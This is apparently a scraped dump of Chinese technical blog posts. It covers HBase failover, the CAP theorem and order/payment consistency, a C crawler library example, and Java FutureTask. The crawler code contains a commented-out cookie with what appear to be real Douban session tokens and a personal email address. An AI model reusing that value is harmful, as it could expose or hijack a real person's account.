\nGoogle内部MegaStore就作为Bigtable的一个补充而出现，在Bigtable的上层支持了SQL，事务、索引、跨机房灾备，并成为大名鼎鼎的Gmail、Google App Engine、Android Market的底层存储。因此我们决定以MegaStore为理论模型进行探索如何在HBase系统上不牺牲线性拓展能力，同时又能提供跨行事务、索引、SQL的功能。 \nHBase系统故障恢复的优化实践 \n其实在第四届中国云计算大会上，当时还在支付宝数据平台的架构师代志远就为大家带来了题为“HBase系统故障恢复的优化实践分享”的精彩演讲，他分析了支付宝海量数据在线处理的现状，以HBase解决方案取代传统MySQL解决方案的技术历程，并详尽分享了Region Server的宕机恢复流程（）。 \n在Hadoop的体系当中，支持实时的一条线，HBase，支持海量数据库初衷的时候，设计为了设计万一级实时数据库，HBase这个东西经过这几年的发展，已经逐渐成为目前业界当中主要的实时数据库，分布式数据库，像支付宝直接上HBase系统，就是考虑到HBase的先进架构，能够帮助支付宝完成现在很多的海量数据的存储以及在线随机读写高性能的访问和存储。 \n不过在HBase的系统当中，体现它的可用性有几个风险。第一个是HBase本身在底层依赖的HDFS，加载了唯一一块数据，单台机器保证一致性，HDFS保持了冗余。第二点，恢复过程当中，Failover过程非常复杂，这个时间消耗越长，作为在线系统，这种时间越长可能会影响到在线访问用户体验。第三点它依赖的HDFS，HBase作为在线数据库依赖HDFS有故障的，经过几小时恢复提供生产业务，对业务方没有直接感受，作为在线系统如果挂掉，如果需要经过近小时恢复时间，恐怕就会直接收到自于支付宝外部的用户投诉了。HBase目前它自己的监控体系尚不完善，目前的监控力度非常得粗，只能监控到单台的Region Server的情况，看不到当前用户表有多少读写比例，看不到当前服务结点写作量多少，读出量多少。 \nRegion Server在恢复过程当中有几个流程，这个流程很复杂，流程非常非常多，以当前的系统规模，它凸显出来的问题，这几个流程是影响到它的恢复速度的关键流程。等待时间周期非常长，周期之所以比较长，是因为现在的机器发展速度非常得快，每台机器从两个G到8个G，96G，140G的大层次的机器，Java语言实现了系统当中大内存管理本身存在问题，除非革新这门语言，否则别无他法。如果说在设计的参数不合理，就可能会导致一个问题，有可能这台服务器就会停止运行，发生这么一次情况就非常可怕，几十G的内存这个过程需要几十秒甚至上分钟，通常情况下，我们会设置到3分钟，这就意味着，为了避免出现这种问题，就会同时引入新的问题，宕机之后恢复等待时间需要三分钟。第二个关键流程当中，当它感知到已经挂掉了，在线数据库协助WL数据重新做到存储当中去，以保证实时更新是同步，否则这个数据库肯定要丢出去，重做数据过程当中，会有一个过程，Split Hlog，跟当前数据量有关系，Edit Log数据又比较多，大家在业余时间可以进行测试，数据不以支付宝的为准，以当前数据系统大小为准。 \n第三个关键流程，重做完数据之后，这部分重新上线，上线之前进行数据进行二次扫描，告诉系统，Region怎么加入到Region Server当中去，扫描也存在问题，问题可能引发到两分钟到6分钟，这也跟当前系统数据有关。第四部分，这个过程称之为再次上线的过程，这个再次上线，上线时间跟当前这台机器的Region上线有关系。支付宝面对消费记录查询，用户查不出来数据，15分钟之后才能查到，在面临在线问题上这是非常可怕的事情。 \n针对Region Server这一关键流程，做了一些优化。这个优化正是提到关键流程第一点，在判断宕机超市的情况下，不强依赖于Zookeeper，支付宝又启动了监控进程Mirror Process，每一台，Region Server当中都会起到PID存不存在，这种检查并非完全可靠，当检查PID不存在，就有理由认为已经挂掉了，要进行可靠检查，通常DBA在线判断数据库是否可用，通常会用PIng连续服务端口，这就弥补了系动中的调用命令不可靠的事情。最后当发现服务端口不可用时，有理由认为当前进程已经死掉了，死掉了之后，那么就按照现有逻辑删除结点，这三分钟的时间就完全省略掉了。（整理/，审校/包研） \n11月30日-12月1日，北京新云南皇冠假日酒店，业内将迎来国内大数据领域最纯粹的技术盛会——HBTC 2012(Hadoop&BigData Technology Conference 2012）。Hadoop及云计算生态系统的力量齐聚北京，欢迎热爱开源的朋友们加入！报名网址参见。 \n发布于 1年前， 阅读(112) | 评论(0) | 投票(0) | 收藏(2) \n原 \n分类: \n292012-11在前面三篇文章中，介绍了关于分布式系统中数据一致性的问题，这一篇主要介绍CAP定理以及自己对CAP定理的了解。 \nCAP定理是2000年，由 Eric Brewer 提出来的 \nBrewer认为在分布式的环境下设计和部署系统时，有3个核心的需求，以一种特殊的关系存在。这里的分布式系统说的是在物理上分布的系统，比如我们常见的web系统。 \n这3个核心的需求是：Consistency，Availability和Partition Tolerance，赋予了该理论另外一个名字 － CAP。 \nConsistency：一致性，这个和数据库ACID的一致性类似，但这里关注的所有数据节点上的数据一致性和正确性，而数据库的ACID关注的是在在一个事务内，对数据的一些约束。 \nAvailability：可用性，关注的在某个结点的数据是否可用，可以认为某一个节点的系统是否可用，通信故障除外。 \nPartition Tolerance：分区容忍性，是否可以对数据进行分区。这是考虑到性能和可伸缩性。 \n为什么不能完全保证这个三点了，个人觉得主要是因为一旦进行分区了，就说明了必须节点之间必须进行通信，涉及到通信，就无法确保在有限的时间内完成指定的行文，如果要求两个操作之间要完整的进行，因为涉及到通信，肯定存在某一个时刻只完成一部分的业务操作，在通信完成的这一段时间内，数据就是不一致性的。如果要求保证一致性，那么就必须在通信完成这一段时间内保护数据，使得任何访问这些数据的操作不可用。 \n如果想保证一致性和可用性，那么数据就不能够分区。一个简单的理解就是所有的数据就必须存放在一个数据库里面，不能进行数据库拆分。这个对于大数据量，高并发的互联网应用来说，是不可接受的。 \n我们可以拿一个简单的例子来说明：假设一个购物系统，卖家A和卖家B做了一笔交易100元，交易成功了，买家把钱给卖家。 \n这里面存在两张表的数据：Trade表Account表 ，涉及到三条数据Trade(100),Account A ,Account B \n假设 trade表和account表在一个数据库，那么只需要使用数据库的事务，就可以保证一致性，同时不会影响可用性。但是随着交易量越来越大，我们可以考虑按照业务分库，把交易库和account库单独分开，这样就涉及到trade库和account库进行通信，也就是存在了分区，那么我们就不可能同时保证可用性和一致性。 \n我们假设初始状态 \ntrade(buyer,seller,tradeNo,status) = trade(A,B,20121001,I) \naccount(accountNo,balance) = account(A,300) \naccount(accountNo,balance) = account(B,10) \n在理想情况下，我们期望的状态是 \ntrade(buyer,seller,tradeNo,status) = trade(A,B,20121001,S) \naccount(accountNo,balance) = account(A,200) \naccount(accountNo,balance) = account(B,110) \n但是考虑到一些异常情况 \n假设在trade(20121001,S)更新完成之前，帐户A进行扣款之后，帐户A进行了另外一笔300款钱的交易，把钱消费了，那么就存在一个状态 \ntrade(buyer,seller,tradeNo,status) = trade(A,B,20121001,S) \naccount(accountNo,balance) = account(A,0) \naccount(accountNo,balance) = account(B,10) \n产生了数据不一致的状态 \n由于这个涉及到资金上的问题，对资金要求比较高，我们必须保证一致性，那么怎么办，只能在进行trade(A,B,20121001)交易的时候，对于任何A的后续交易请求trade(A,X,X)，必须等到A完成之后，才能够进行处理，也就是说在进行trade(A,B,20121001)的时候，Account(A)的数据是不可用的。 \n任何架构师在设计分布式的系统的时候，都必须在这三者之间进行取舍。首先就是是否选择分区，由于在一个数据分区内，根据数据库的ACID特性，是可以保证一致性的，不会存在可用性和一致性的问题，唯一需要考虑的就是性能问题。对于可用性和一致性，大多数应用就必须保证可用性，毕竟是互联网应用，牺牲了可用性，相当于间接的影响了用户体验，而唯一可以考虑就是一致性了。 \n牺牲一致性 \n对于牺牲一致性的情况最多的就是缓存和数据库的数据同步问题，我们把缓存看做一个数据分区节点，数据库看作另外一个节点，这两个节点之间的数据在任何时刻都无法保证一致性的。在web2.0这样的业务，开心网来举例子，访问一个用户的信息的时候，可以先访问缓存的数据，但是如果用户修改了自己的一些信息，首先修改的是数据库，然后在通知缓存进行更新，这段期间内就会导致的数据不一致，用户可能访问的是一个过期的缓存，而不是最新的数据。但是由于这些业务对一致性的要求比较高，不会带来太大的影响。 \n异常错误检测和补偿 \n还有一种牺牲一致性的方法就是通过一种错误补偿机制来进行，可以拿上面购物的例子来说，假设我们把业务逻辑顺序调整一下，先扣买家钱，然后更新交易状态，在把钱打给卖家 \n我们假设初始状态 \naccount(accountNo,balance) = account(A,300) \naccount(accountNo,balance) = account(B,10) \ntrade(buyer,seller,tradeNo,status) = trade(A,B,20121001,I) \n那么有可能出现 \naccount(accountNo,balance) = account(A,200) \ntrade(buyer,seller,tradeNo,status) = trade(A,B,20121001,S) \naccount(accountNo,balance) = account(B,10) \n那么就出现了A扣款成功，交易状态也成功了，但是钱没有打给B，这个时候可以通过一个时候的异常恢复机制，把钱打给B，最终的情况保证了一致性，在一定时间内数据可能是不一致的，但是不会影响太大。 \n两阶段提交协议 \n当然，还有一种方式就是我另外一篇文章里面《X/Open DTP-分布式事务模型》里面说的，但是再第一阶段和第二阶段之间，数据也可不能是一致性的，也可能出现同样的情况导致异常。而且DTP的分布式事务模型 限制太多，例如必须有实现其功能的相关的容器支持，并且资源管理器也必须实现了XA规范。限制比较多。 \n国外有的架构师有两种方案去解决CAP的限制，但是也是比较适合特定的业务，而没有通用的解决方案， \n探知分区->分区内操作->事后补偿\n\n就是上面介绍的异常检测恢复机制，这种机制其实还是有限制， \n首先对于分区检测操作，不同的业务涉及到的分区操作可能不一样 \n分区内操作限制：不同的业务对应的约束不一致 \n事后补偿：由于业务约束不一样，补偿方式也不一样。 \n所以这只能作为一种思想，不能做一个通用的解决方案 \n转载自： \n发布于 1年前， 阅读(69) | 评论(0) | 投票(0) | 收藏(0) \n原 \n分类: \n292012-11关于分布式系统的数据一致性问题(三) \n在我的博文里面 里面主要介绍了数据分布的情况下保证一致性的情况，在第二篇文章里面，我这里提出了三个问题 \n订单系统调用支付系统支付订单，支付成功，但是返回给订单系统数据超时，订单还是I（初始状态），但是此时会员帐户余额100,会员肯定会马上找京东骂京东，为啥不给老子发货，我都付钱了 \n订单系统调用支付系统成功，状态也已经更新成功，但是通知仓库发货失败，这个时候订单是P（已支付）状态，此时会员帐户余额是100,但是仓库不会发货。会员也要骂京东。 \n订单系统调用支付系统成功，状态也已经更新成功，然后通知仓库发货，仓库告诉订单系统，没有货了。这个时候数据状态和第二种情况一样。 \n重点分析解决了第一个的问题以及相应的方案，发现在数据分布的环境下，很难绝对的保证数据一致性（任何一段区间），但是有办法通过一种补偿机制，最终保证数据的一致性。 \n在下面在分析一下第二个问题 \n订单系统调用支付系统成功，状态也已经更新成功，但是通知仓库发货失败，这个时候订单是P（已支付）状态，此时会员帐户余额是100,但是仓库不会发货。会员也要骂京东。 \n通过在上一篇文章里面分析过，这个相对来说是比较简单的，我可以采取重试机制，如果发现通知仓库发货失败，就一致重试， \n这里面有两种方式： \n1 异步方式：通过类似MQ（消息通知）的机制，这个是异步的通知 \n2 同步调用：类似于远程过程调用 \n对于同步的调用的方式，比较简单，我们能够及时获取结果，对于异步的通知，就必须采用请求，应答的方式进行，这一点在（）里面有介绍。这里面就不再阐述。 \n来看看第三个问题 \n订单系统调用支付系统成功，状态也已经更新成功，然后通知仓库发货，仓库告诉订单系统，没有货了。这个时候数据状态和第二种情况一样。 \n我觉得这是一个很有意思的问题，我们还是考虑几种解决的方案 \n1 在会员下单的时刻，就告诉仓库，我要你把货物留下来， \n2 在会员支付订单时候，在支付之前检查仓库有没有货，如果没有货，就告知会员木有货物了 \n3 如果会员支付成功，这个时候没有货了，就会退款给用户或者等待有货的时候在发货 \n正常情况，京东的仓库一般都是有货的，所以影响到的会员很少，但是在秒杀和营销的时候，这个时候就不一定了，我们考虑假设仓库有10台iphone \n如果采用第一种方案， \n1 在会员下单的时候，相当于库存就-1，那么用户恶意拍下来，没有去支付，就影响到了其他用户的购买。京东可以设置一个订单超时时间，如果这段时间内没有支付，就自动取消订单 \n2 在会员支付之前，检查仓库有货，这种方案了，对于用户体验不好，但是对于京东比较好，至少我东西都卖出去了。那些没有及时付款的用户，只能投诉了京东无故取消订单 \n3 第三种方案，这个方案体验更不好，而且用户感觉受到京东欺诈，但是对于京东来说，比第二种方案更有益，毕竟我还可以多卖出一点东西。 \n个人觉得，京东应该会采用第二种或者第三种方式来处理这类情况，我在微博上搜索了 “京东 无故取消订单”，发现果真和我预料的处理方式。不过至于这里的无故取消是不是技术上的原因我不知道，如果真的是技术上的原因，我觉得京东可以采用不同的处理方案。对于秒杀和促销商品，可以考虑第一种方案，大多数人都会直接付款，毕竟便宜啊，如果用户抢不到便宜的东西，抱怨当然很大了。这样可以照顾大多数用户的体验。对于一般的订单，可以采用第二种或者第三种方式，这种情况下，发生付款之后仓库没有货的情况会比较少，并且就算发生了，用户也会觉得无所谓，大不了退钱吗，这样就可以实现自己的利益最大化而最低程度的减少用户体验。\n\n而铁道部在这个问题上，采用的是第一种方案，为什么和京东不一样，就是因为用户体验，如果用户把票都买了，你告诉我木有票了，旅客会杀人的。哈哈，不过铁道部不担心票卖不出去，第一种方案对他影响没有什么。 \n说了这么多，就是说 分布式环境下（数据分布）要任何时刻保证数据一致性是不可能的，只能采取妥协的方案来保证数据最终一致性。这个也就是著名的CAP定理。 \n转载自： \n发布于 1年前， 阅读(36) | 评论(0) | 投票(0) | 收藏(0) \n原 \n分类: \n292012-11在里面，简单的介绍了分布式数据的同步问题，上面的问题比较抽象，在目前的互联网应用中还很少见，这次在通过一个比较常见的例子，让大家更深入的了解一下分布式系统设计中关于数据一致性的问题 \n这次我们拿我们经常使用的功能来考虑吧，最近网购比较热门，就以京东为例的，我们来看看京东的一个简单的购物流程\n\n用户在京东上下了一个订单，发现自己在京东的账户里面有余额，然后使用余额支付，支付成功之后，订单状态修改为支付成功，然后通知仓库发货。假设订单系统，支付系统，仓库系统是三个独立的应用，是独立部署的，系统之间通过远程服务调用。 \n订单的有三个状态：I:初始 P:已支付 W:已出库，订单金额100, 会员帐户余额200 \n如果整个流程比较顺利，正常情况下，订单的状态会变为I->P->W，会员帐户余额100，订单出库。 \n但是如果流程不顺利了？考虑以下几种情况 \n1：订单系统调用支付系统支付订单，支付成功，但是返回给订单系统数据超时，订单还是I（初始状态），但是此时会员帐户余额100,会员肯定会马上找京东骂京东，为啥不给老子发货，我都付钱了 \n2：订单系统调用支付系统成功，状态也已经更新成功，但是通知仓库发货失败，这个时候订单是P（已支付）状态，此时会员帐户余额是100,但是仓库不会发货。会员也要骂京东。 \n3：订单系统调用支付系统成功，状态也已经更新成功，然后通知仓库发货，仓库告诉订单系统，没有货了。这个时候数据状态和第二种情况一样。 \n对于问题一，我们来分析一下解决方案，能想到的解决方案如下 \n1 假设调用支付系统支付订单的时候先不扣钱，订单状态更新完成之后，在通知支付系统你扣钱 \n如果采用这种设计方案，那么在同一时刻，这个用户，又支付了另外一笔订单，订单价格200，顺利完成了整个订单支付流程，由于当前订单的状态已经变成了支付成功，但是实际用户已经没有钱支付了，这笔订单的状态就不一致了。即使用户在同一个时刻没有进行另外的订单支付行为，通知支付系统扣钱这个动作也有可能完不成，因为也有可能失败，反而增加了系统的复杂性。 \n2 订单系统自动发起重试，多重试几次，例如三次，直到扣款成功为止。 \n这个看起来也是不错的考虑，但是和解决方案一样，解决不了问题，还会带来新的问题，假设订单系统第一次调用支付系统成功，但是没有办法收到应答，订单系统又发起调用，完了，重复支付，一次订单支付了200。 \n假设支付系统正在发布，你重试多少次都一样，都会失败。这个时候用户在等待，你怎么处理？ \n3 在第二种方案的基础上，我们先解决订单的重复支付行为，我们需要在支付系统上对订单号进行控制，一笔订单如果已经支付成功，不能在进行支付。返回重复支付标识。那么订单系统根据返回的标识，更新订单状态。 \n接下来解决重试问题，我们假设应用上重试三次，如果三次都失败，先返回给用户提示支付结果未知。假设这个时候用户重新发起支付，订单系统调用支付系统，发现订单已经支付，那么继续下面的流程。如果会员没有发起支付，系统定时（一分钟一次）去核对订单状态，如果发现已经被支付，则继续后续的流程。 \n这种方案，用户体验非常差，告诉用户支付结果未知，用户一定会骂你，你丫咋回事情，我明明支付了，你告诉我未知。假设告诉用户支付失败，万一实际是成功的咋办。你告诉用户支付成功，万一支付失败咋办。 \n4 第三种方案能够解决订单和支付数据的一致性问题，但是用户体验非常差。当然这种情况比较可能是少数，可以牺牲这一部分的用户体验，我们还有没有更好的解决方案，既能照顾用户体验，又能够保证资金的安全性。 \n我们再回来看看第一种方案，我们先不扣钱，但是有木有办法让这一部分钱不让用户使用，对了，我们先把这一部分钱冻结起来，订单系统先调用支付系统成功的时候，支付系统先不扣钱，而是先把钱冻结起来，不让用户给其他订单支付，然后等订单系统把订单状态更新为支付成功的时候，再通知支付系统，你扣钱吧，这个时候支付系统扣钱，完成后续的操作。 \n看起来这个方案不错，我们仔细在分析一下流程，这个方案还存在什么问题，假设订单系统在调用支付系统冻结的时候，支付系统冻结成功，但是订单系统超时，这个时候返回给用户，告知用户支付失败，如果用户再次支付这笔订单，那么由于支付系统进行控制，告诉订单系统冻结成功，订单系统更新状态，然后通知支付系统，扣钱吧。如果这个时候通知失败，木有问题，反正钱都已经是冻结的了，用户不能用，我只要定时扫描订单和支付状态，进行扣钱而已。 \n那么如果变态的用户重新拍下来一笔订单,100块钱，对新的订单进行支付，这个时候由于先前那一笔订单的钱被冻结了，这个时候用户余额剩余100，冻结100，发现可用的余额足够，那就直接在对用户扣钱。这个时候余额剩余0，冻结100。先前那一笔怎么办，一个办法就是定时扫描，发现订单状态是初始的话，就对用户的支付余额进行解冻处理。这个时候用户的余额变成100，订单数据和支付数据又一致了。假设原先用户余额只有100，被冻结了，用户重新下单，支付的时候就失败了啊，的确会发生这一种情况，所以要尽可能的保证在第一次订单结果不明确的情况，尽早解冻用户余额，比如10秒之内。但是不管如何快速，总有数据不一致的时刻，这个是没有办法避免的。 \n第二种情况和第三种情况如何处理，下次在分析吧。 \n由于互联网目前越来越强调分布式架构，如果是交易类系统，面临的将会是分布式事务上的挑战。当然目前有很多开源的分布式事务产品，例如java JPA，但是这种解决方案的成本是非常高的，而且实现起来非常复杂，效率也比较低下。对于极端的情况：例如发布，故障的时候都是没有办法保证强一致性的。 \n转载自： \n发布于 1年前， 阅读(41) | 评论(0) | 投票(0) | 收藏(1) \n原 \n分类: \n292012-11关于分布式系统的数据一致性问题(一)\n\n先把问题简单化处理，假设A增加一条记录Message_A，发送到M，B增加一条记录 MESSAGE_B发送到M，都是通过MQ服务器进行转发，那么M系统接收到条消息，增加两条数据，那么M在把增加的消息群发给A，B，A和B找到自己缺失的数据，更新数据库。这样就完成了一个数据的同步。 \n从正常情况下来看，都没有问题，逻辑完全合理，但是请考虑以下三个问题 \n1 如何保证A->M的消息，M一定接收到了，同样，如何保证M->A的消息，M一定接收到了 \n2 如果数据需要一致性更新，比如A发送了三条消息给M，M要么全部保存，要么全部不保存，不能够只保存其中的几条记录。我们假设更新的数据是一条条发送的。 \n3 假设同时A发送了多条更新请求，如何保证顺序性要求？ \n这两个问题就是分布式环境下数据一致性的问题 \n对于第一个问题，比较好解决，我们先看看一个tcp/ip协议链接建立的过程\n\n我们的思路可以从这个上面出发，在简化一下，就一个请求，一个应答。 \n简单的通信模型是这样的 \nA->M : 你收到我的一条消息没有，消息的ID是12345 \nM->A:  我收到了你的一条消息数据，消息数据是ID;12345 \n这样就一个请求，一个应答，就完成了一次可靠性的传输。如果A一致没有收到M的应答，就不断的重试。这个时候M就必须保证幂等性。不能重复的处理消息。那么最极端的情况是，怎么也收不到M的应答，这个时候是系统故障。自己检查一下吧。 \n这么设计就要求，A在发送消息的时候持久化这个消息的数据内容，然后不断的重试，一旦接收到M的应答，就删除这条消息。同样，M端也是一样的。不要相信MQ的持久化机制，不是很靠谱的。 \n那么M给A发送消息也采取类似的原理就可以了。 \n下面在看看第二个问题，如何保持数据的一致性更新，这个还是可以参考TCP/IP的协议。 \n首先A发送一条消息给M：我要发送一批消息数据给你，批次号是10000，数据是5条。 \nM发送一条消息给A：ok，我准备好了，批次号是10000，发送方你A \n接着A发送5条消息给M，消息ID分别为1，2，3，4，5 ，批次号是10000， \n紧接着，A发送一个信息给M：我已经完成5小消息的发送，你要提交数据更新了 \n接下来可能发送两种情况 \n1 那么M发送消息给A：ok，我收到了5条消息，开始提交数据 \n2 那么M也可以发送给A：我收到了5条消息，但是还缺少，请你重新发送，那么A就继续发送，直到A收到M成功的应答。 \n整个过程相当复杂。这个也就是数据一旦分布了，带来最大的问题就是数据一致性的问题。这个成本非常高。 \n对于第三个问题，这个就比较复杂了 \n这个最核心的问题就是消息的顺序性，我们只能在每个消息发一个消息的序列号，但是还是没有最好解决这个问题的办法。因为消息接收方不知道顺序。因为即使给他了序列号，也没有办法告诉他，这个应该何时处理。最好的办法是在第二种方式的基础作为一个批次来更新。 \n这个只是以最简单的例子来说明一下分布式系统的要保证数据一致性是一件代价很大的事情。当然有的博主会说，这个何必这么复杂，直接数据库同步不就可以了。这个例子当然是没有问题的，万一这个几个库的模型都不一样，我发送消息要处理的事情不一样的。怎么办？", "time": "2018_08_14_11_12_52", "link": "https://blog.csdn.net/tototuzuoquan/article/details/78573840", "title": "分布式与集群的区别，一致性hash,hadoop与HBASE，消息，关于分布式系统的数据一致性问题（来自公众号：360doc个人图书馆）"}
{"timestamp": "2018_08_14_11_12_57", "desc": "前言 \n大家在平时或多或少地都会有编写网络爬虫的需求。一般来说，编写爬虫的首选自然非python莫属，除此之外，java等语言也是不错的选择。选择上述语言的原因不仅仅在于它们均有非常不错的网络请求库和字符串处理库，还在于基于上述语言的爬虫框架非常之多和完善。良好的爬虫框架可以确保爬虫程序的稳定性，以及编写程序的便捷性。所以，这个cspider爬虫库的使命在于，我们能够使用c语言，依然能够优雅地编写爬虫程序。\n\n爬虫的特性 \n配置方便。使用一句设置函数，即可定义user agent，cookie，timeout，proxy以及抓取线程和解析线程的最大数量。 \n程序逻辑独立。用户可以分别定义爬虫的解析函数，和数据持久化函数。并且对于解析到的新url，用户可以使用cspider提供的addUrl函数，将其加入到任务队列中。 \n便捷的字符串处理。cspider中提供了基于pcre的简单的正则表达式函数，基于libxml2的xpath解析函数，以及用于解析json的cJSON库。 \n高效的抓取。cspider基于libuv调度抓取线程和解析线程，使用curl作为其网络请求库。 \n使用cspider的步骤 \n获取cspider_t。 \n自定义user agent，cookie，timeout，proxy以及抓取线程和解析线程的最大数量。 \n添加初始要抓取的url到任务队列。 \n编写解析函数和数据持久化函数。 \n启动爬虫。 \n例子 \n先来看下简单的爬虫例子，会在后面详细讲解例子。\n\n\n\n#include<cspider/spider.h>\n\n/*\n    自定义的解析函数，d为获取到的html页面字符串\n*/\nvoid p(cspider_t *cspider, char *d) {\n\n  char *get[100];\n  //xpath解析html\n  int size = xpath(d, \"//body/div[@class='wrap']/div[@class='sort-column area']/div[@class='column-bd cfix']/ul[@class='st-list cfix']/li/strong/a\", get, 100);\n\n  int i;\n  for (i = 0; i < size; i++) {\n  //将获取到的电影名称，持久化\n    saveString(cspider, get[i]);\n  }\n\n}\n/*\n    数据持久化函数，对上面解析函数中调用的saveString()函数传入的数据，进行进一步的保存\n*/\nvoid s(void *str) {\n  char *get = (char *)str;\n  printf(\"%sn\", get);\n  return;\n}\n\nint main() {\n  //初始化spider\n  cspider_t *spider = init_cspider();\n  char *agent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0\";\n  //char *cookie = \"bid=s3/yuH5Jd/I; ll=108288; viewed=1130500_24708145_6433169_4843567_1767120_5318823_1899158_1271597; __utma=30149280.927537245.1446813674.1446983217.1449139583.4; __utmz=30149280.1449139583.4.4.utmcsr=accounts.douban.com|utmccn=(referral)|utmcmd=referral|utmcct=/login; ps=y; ue=965166527@qq.com; dbcl2=58742090:QgZ2PSLiDLQ; ck=T9Wn; push_noty_num=0; push_doumail_num=7; ap=1; __utmb=30149280.0.10.1449139583; __utmc=30149280\";\n\n  //设置要抓取页面的url\n  cs_setopt_url(spider, \"so.tv.sohu.com/list_p1100_p20_p3_u5185_u5730_p40_p5_p6_p77_p80_p9_2d1_p101_p11.html\");\n  //设置user agent\n  cs_setopt_useragent(spider, agent);\n  //cs_setopt_cookie(spider, cookie);\n  //传入解析函数和数据持久化函数的指针\n  cs_setopt_process(spider, p);\n  cs_setopt_save(spider, s);\n  //设置线程数量\n  cs_setopt_threadnum(spider, DOWNLOAD, 2);\n  cs_setopt_threadnum(spider, SAVE, 2);\n  //FILE *fp = fopen(\"log\", \"wb+\");\n  //cs_setopt_logfile(spider, fp);\n  //开始爬虫\n  return cs_run(spider);\n}\n\n例子讲解 \ncspider_t *spider = init_cspider();获取初始的cspider。cs_setopt_xxx这类函数可以用来进行初始化设置。其中要注意的是:cs_setopt_process(spider,p);与cs_setopt_save(spider,s);，它们分别设置了解析函数p和数据持久化函数s，这两个函数需要用户自己实现。在解析函数中，用户要定义解析的规则，并对解析得到的字符串可以调用saveString进行持久化，或者是调用addUrl将url加入到任务队列中。在saveString中传入的字符串会在用户自定义的数据持久函数中得到处理。此时，用户可以选择输出到文件或数据库等。 \n最后调用cs_run(spider)即可启动爬虫。 \n具体的API参数可在这里查看\n\n总结 \n赶快使用cspider爬虫框架来编写爬虫吧！如果在使用过程中发现bug，欢迎反馈。\n\n\n\n\n  原文地址：http://www.kuqin.com/shuoit/20151207/349356.html\n\n\n欢迎关注我的微博：well火柴  \n欢迎访问我的主页：http://www.wellwj.com", "time": "2018_08_14_11_12_57", "link": "https://blog.csdn.net/u013553804/article/details/53844840", "title": "如何优雅地使用c语言编写爬虫"}
{"timestamp": "2018_08_14_11_12_58", "desc": "1 FutureTask概念\n\nFutureTask一个可取消的异步计算，FutureTask 实现了Future的基本方法，提空 start cancel 操作，可以查询计算是否已经完成，并且可以获取计算的结果。结果只可以在计算完成之后获取，get方法会阻塞当计算没有完成的时候，一旦计算已经完成，那么计算就不能再次启动或是取消。\n\n一个FutureTask 可以用来包装一个 Callable 或是一个runnable对象。因为FurtureTask实现了Runnable方法，所以一个 FutureTask可以提交(submit)给一个Excutor执行(excution).\n\n\n\n2 FutureTask使用场景\n\nFutureTask可用于异步获取执行结果或取消执行任务的场景。通过传入Runnable或者Callable的任务给FutureTask，直接调用其run方法或者放入线程池执行，之后可以在外部通过FutureTask的get方法异步获取执行结果，因此，FutureTask非常适合用于耗时的计算，主线程可以在完成自己的任务后，再去获取结果。另外，FutureTask还可以确保即使调用了多次run方法，它都只会执行一次Runnable或者Callable任务，或者通过cancel取消FutureTask的执行等。\n\n\n\n2.1 FutureTask执行多任务计算的使用场景\n\n利用FutureTask和ExecutorService，可以用多线程的方式提交计算任务，主线程继续执行其他任务，当主线程需要子线程的计算结果时，在异步获取子线程的执行结果。\n\n\n\npublic class FutureTest1 {\n\n    public static void main(String[] args) {\n        Task task = new Task();// 新建异步任务\n        FutureTask<Integer> future = new FutureTask<Integer>(task) {\n            // 异步任务执行完成，回调\n            @Override\n            protected void done() {\n                try {\n                    System.out.println(\"future.done():\" + get());\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (ExecutionException e) {\n                    e.printStackTrace();\n                }\n            }\n        };\n        // 创建线程池（使用了预定义的配置）\n        ExecutorService executor = Executors.newCachedThreadPool();\n        executor.execute(future);\n\n        try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e1) {\n            e1.printStackTrace();\n        }\n        // 可以取消异步任务\n        // future.cancel(true);\n\n        try {\n            // 阻塞，等待异步任务执行完毕-获取异步任务的返回值\n            System.out.println(\"future.get():\" + future.get());\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } catch (ExecutionException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // 异步任务\n    static class Task implements Callable<Integer> {\n        // 返回异步任务的执行结果\n        @Override\n        public Integer call() throws Exception {\n            int i = 0;\n            for (; i < 10; i++) {\n                try {\n                    System.out.println(Thread.currentThread().getName() + \"_\"\n                            + i);\n                    Thread.sleep(500);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            return i;\n        }\n    }\n\n}\n\n\n\n\n\n\n2.2 FutureTask在高并发环境下确保任务只执行一次\n\n在很多高并发的环境下，往往我们只需要某些任务只执行一次。这种使用情景FutureTask的特性恰能胜任。举一个例子，假设有一个带key的连接池，当key存在时，即直接返回key对应的对象；当key不存在时，则创建连接。对于这样的应用场景，通常采用的方法为使用一个Map对象来存储key和连接池对应的对应关系，典型的代码如下面所示：\n\n\n\nprivate Map<String, Connection> connectionPool = new HashMap<String, Connection>();  \nprivate ReentrantLock lock = new ReentrantLock();  \n\npublic Connection getConnection(String key){  \n    try{  \n        lock.lock();  \n        if(connectionPool.containsKey(key)){  \n            return connectionPool.get(key);  \n        }  \n        else{  \n            //创建 Connection  \n            Connection conn = createConnection();  \n            connectionPool.put(key, conn);  \n            return conn;  \n        }  \n    }  \n    finally{  \n        lock.unlock();  \n    }  \n}  \n\n//创建Connection（根据业务需求，自定义Connection）  \nprivate Connection createConnection(){  \n    return null;  \n}  \n\n在上面的例子中，我们通过加锁确保高并发环境下的线程安全，也确保了connection只创建一次，然而确牺牲了性能。改用ConcurrentHash的情况下，几乎可以避免加锁的操作，性能大大提高，但是在高并发的情况下有可能出现Connection被创建多次的现象。这时最需要解决的问题就是当key不存在时，创建Connection的动作能放在connectionPool之后执行，这正是FutureTask发挥作用的时机，基于ConcurrentHashMap和FutureTask的改造代码如下：\n\nprivate ConcurrentHashMap<String,FutureTask<Connection>>connectionPool = new ConcurrentHashMap<String, FutureTask<Connection>>();  \n\npublic Connection getConnection(String key) throws Exception{  \n    FutureTask<Connection>connectionTask=connectionPool.get(key);  \n    if(connectionTask!=null){  \n        return connectionTask.get();  \n    }  \n    else{  \n        Callable<Connection> callable = new Callable<Connection>(){  \n            @Override  \n            public Connection call() throws Exception {  \n                // TODO Auto-generated method stub  \n                return createConnection();  \n            }  \n        };  \n        FutureTask<Connection>newTask = new FutureTask<Connection>(callable);  \n        connectionTask = connectionPool.putIfAbsent(key, newTask);  \n        if(connectionTask==null){  \n            connectionTask = newTask;  \n            connectionTask.run();  \n        }  \n        return connectionTask.get();  \n    }  \n}  